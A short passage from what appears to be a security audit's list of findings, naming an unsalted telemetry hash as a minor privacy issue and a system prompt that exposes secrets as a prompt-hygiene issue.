18. **FINDING-16** (Unsalted telemetry hash) — Minor privacy enhancement.
19. **FINDING-19** (System prompt teaches secrets) — Prompt hygiene.
